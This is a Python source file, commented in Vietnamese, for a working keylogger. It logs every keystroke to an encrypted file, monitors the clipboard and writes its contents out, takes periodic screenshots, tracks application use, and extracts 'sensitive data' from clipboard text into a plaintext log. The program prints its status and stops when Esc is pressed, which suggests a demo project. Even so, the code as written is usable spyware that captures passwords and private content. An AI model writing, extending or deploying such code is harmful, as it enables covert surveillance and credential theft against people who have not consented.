import platform
import os
import sys
import time
import threading
import subprocess
from datetime import datetime
from pynput import keyboard
import pyperclip
from cryptography.fernet import Fernet
import json
import base64
from app_monitor import AppMonitor
from content_analyzer import ContentAnalyzer

class Keylogger:
    def __init__(self):
        # Xác định hệ điều hành
        self.is_windows = platform.system() == 'Windows'
        
        # Khởi tạo các đường dẫn
        self.log_dir = "logs"
        self.screenshot_dir = os.path.join(self.log_dir, "screenshots")
        self.log_file = os.path.join(self.log_dir, "keylog.txt")
        self.clipboard_file = os.path.join(self.log_dir, "clipboard.txt")
        self.config_file = os.path.join(self.log_dir, "config.json")
        
        # Khởi tạo các biến khác
        self.start_time = None
        self.listener = None
        self.last_clipboard = ""
        self.running = True
        self.key_count = 0
        self.screenshot_interval = 100
        
        # Khởi tạo các module
        self.app_monitor = AppMonitor(self.log_dir)
        self.content_analyzer = ContentAnalyzer()
        
        # Tạo thư mục log
        self.ensure_log_directory()
        
        # Khởi tạo mã hóa
        self.init_encryption()
        
        # Đăng ký xử lý tín hiệu
        if not self.is_windows:
            import signal
            signal.signal(signal.SIGINT, self.handle_exit)
            signal.signal(signal.SIGTERM, self.handle_exit)

    def init_encryption(self):
        """Khởi tạo hoặc tải key mã hóa"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'rb') as f:
                    config = json.load(f)
                    self.encryption_key = base64.b64decode(config['key'])
            else:
                self.encryption_key = Fernet.generate_key()
                config = {'key': base64.b64encode(self.encryption_key).decode()}
                with open(self.config_file, 'w') as f:
                    json.dump(config, f)
            
            self.cipher_suite = Fernet(self.encryption_key)
            print("Đã khởi tạo mã hóa thành công")
        except Exception as e:
            print(f"Lỗi khi khởi tạo mã hóa: {e}")
            sys.exit(1)
        
    def ensure_log_directory(self):
        """Tạo thư mục để lưu log"""
        try:
            if not os.path.exists(self.log_dir):
                os.makedirs(self.log_dir)
            if not os.path.exists(self.screenshot_dir):
                os.makedirs(self.screenshot_dir)
            print(f"Thư mục log được tạo tại: {os.path.abspath(self.log_dir)}")
        except Exception as e:
            print(f"Lỗi khi tạo thư mục: {e}")
            sys.exit(1)
    
    def encrypt_data(self, data):
        """Mã hóa dữ liệu trước khi lưu"""
        try:
            return self.cipher_suite.encrypt(data.encode())
        except Exception as e:
            print(f"Lỗi khi mã hóa dữ liệu: {e}")
            return None
    
    def save_log(self, data):
        """Lưu log đã mã hóa"""
        try:
            encrypted_data = self.encrypt_data(data)
            if encrypted_data:
                with open(self.log_file, 'ab') as f:
                    f.write(encrypted_data + b'\n')
        except Exception as e:
            print(f"Lỗi khi lưu log: {e}")
            
    def take_screenshot(self):
        """Chụp ảnh màn hình"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
            
            if self.is_windows:
                # Sử dụng pyautogui cho Windows
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)
            else:
                # Sử dụng scrot cho Linux
                display = os.environ.get('DISPLAY', ':1')
                process = subprocess.Popen(
                    ['scrot', '-q', '100', '-z', screenshot_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=dict(os.environ, DISPLAY=display)
                )
                output, error = process.communicate(timeout=5)
                
                if process.returncode != 0:
                    error_msg = error.decode() if error else "Không xác định được lỗi"
                    print(f"Lỗi khi chụp ảnh màn hình: {error_msg}")
                    return
            
            if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
                print(f"Đã chụp ảnh màn hình: {screenshot_path}")
            else:
                print("Không thể lưu ảnh chụp màn hình")
                
        except Exception as e:
            print(f"Lỗi khi chụp ảnh màn hình: {e}")

    def get_clipboard_content(self):
        """Lấy nội dung clipboard"""
        try:
            return pyperclip.paste()
        except Exception:
            return ""

    def monitor_clipboard(self):
        """Theo dõi clipboard"""
        while self.running:
            try:
                current_clipboard = self.get_clipboard_content()
                if current_clipboard and current_clipboard != self.last_clipboard:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    log_data = f'[{timestamp}] Clipboard: {current_clipboard}\n'
                    with open(self.clipboard_file, 'a', encoding='utf-8') as f:
                        f.write(log_data)
                    self.last_clipboard = current_clipboard
                    self.on_clipboard_change(current_clipboard)
            except Exception as e:
                print(f"Lỗi khi theo dõi clipboard: {e}")
            time.sleep(1)

    def on_clipboard_change(self, text):
        """Xử lý khi clipboard thay đổi"""
        if text:
            # Mã hóa và lưu nội dung clipboard
            encrypted_text = self.encrypt_data(text)
            with open(self.clipboard_file, 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now()}: {encrypted_text}\n")
            
            # Phân tích nội dung clipboard
            analysis = self.content_analyzer.analyze_clipboard(text)
            
            # Kiểm tra thông tin nhạy cảm
            if analysis['sensitive_data']:
                self.log_sensitive_data(analysis['sensitive_data'])
                
    def log_sensitive_data(self, sensitive_data):
        """Ghi log thông tin nhạy cảm"""
        with open('logs/sensitive_data.log', 'a') as f:
            for item in sensitive_data:
                f.write(f"{datetime.now()}: {item['type']} - {item['value']}\n")
                
    def on_key_press(self, key):
        """Xử lý khi phím được nhấn"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Chuyển đổi key thành chuỗi
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key).replace("'", "")
            
            # Ghi log phím được nhấn
            log_data = f'[{timestamp}] Phím được nhấn: {key_str}\n'
            self.save_log(log_data)
            
            # Tăng bộ đếm phím
            self.key_count += 1
            
            # Chụp ảnh màn hình theo khoảng thời gian
            if self.key_count % self.screenshot_interval == 0:
                screenshot_thread = threading.Thread(target=self.take_screenshot)
                screenshot_thread.daemon = True
                screenshot_thread.start()
                
        except Exception as e:
            print(f"Lỗi khi ghi log: {e}")

    def on_key_release(self, key):
        """Xử lý khi phím được thả"""
        if key == keyboard.Key.esc:
            self.running = False
            return False

    def handle_exit(self, signum=None, frame=None):
        """Xử lý khi chương trình bị dừng"""
        print("\nĐang dừng keylogger...")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """Dọn dẹp trước khi thoát"""
        try:
            if self.start_time:
                duration = time.time() - self.start_time
                print(f"\nKeylogger đã dừng. Thời gian chạy: {duration:.2f} giây")
            
            print(f"Log đã được lưu tại: {os.path.abspath(self.log_file)}")
            print(f"Clipboard log đã được lưu tại: {os.path.abspath(self.clipboard_file)}")
            print(f"Ảnh chụp màn hình đã được lưu tại: {os.path.abspath(self.screenshot_dir)}")
            print(f"Log ứng dụng đã được lưu tại: {os.path.abspath(os.path.join(self.log_dir, 'app_usage.enc'))}")
            
            print("\nĐể giải mã log, chạy các lệnh:")
            print("- python decrypt_log.py (cho keylog)")
            print("- python decrypt_app_log.py (cho app usage)")
            
            # Dừng giám sát ứng dụng
            self.app_monitor.stop_monitoring()
            
        except Exception as e:
            print(f"Lỗi khi dọn dẹp: {e}")

    def start(self):
        """Bắt đầu keylogger"""
        print("Keylogger đã bắt đầu. Nhấn 'Esc' để dừng.")
        self.start_time = time.time()
        
        try:
            # Bắt đầu theo dõi clipboard trong thread riêng
            clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            clipboard_thread.start()
            
            # Bắt đầu giám sát ứng dụng trong thread riêng
            app_monitor_thread = threading.Thread(target=self.app_monitor.start_monitoring, daemon=True)
            app_monitor_thread.start()
            
            # Bắt đầu lắng nghe sự kiện bàn phím
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release) as listener:
                listener.join()
                
        except Exception as e:
            print(f"Lỗi không mong muốn: {e}")
        finally:
            self.cleanup()

    def analyze_current_line(self):
        """Phân tích dòng hiện tại"""
        try:
            # Đọc dòng cuối cùng từ file log
            with open(self.log_file, 'r') as f:
                lines = f.readlines()
                if lines:
                    last_line = lines[-1].strip()
                    # Phân tích nội dung
                    analysis = self.content_analyzer.analyze_text(last_line)
                    if analysis['sensitive_data']:
                        self.log_sensitive_data(analysis['sensitive_data'])
        except:
            pass
            
    def get_analysis_report(self):
        """Lấy báo cáo phân tích"""
        return {
            'keywords': self.content_analyzer.get_keyword_stats(),
            'sensitive_data': self.content_analyzer.get_sensitive_data_stats(),
            'clipboard_history': self.content_analyzer.get_clipboard_history()
        }

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except KeyboardInterrupt:
        print("\nĐang dừng keylogger...")
        sys.exit(0) 